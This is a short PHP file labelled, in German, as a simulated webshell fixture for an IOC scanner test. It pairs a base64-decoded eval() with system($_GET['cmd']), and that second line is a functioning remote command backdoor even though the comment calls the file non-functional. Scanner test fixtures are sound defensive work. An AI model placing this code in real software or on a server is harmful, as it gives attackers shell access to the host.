<?php
// Test-Fixture: simulierter Webshell (nur für den IOC-Scan-Test, nicht funktionsfähig)
$payload = base64_decode("ZWNobyAiaGlkIjsgaW5kZXg=");
eval($payload);
system($_GET['cmd']);
?>
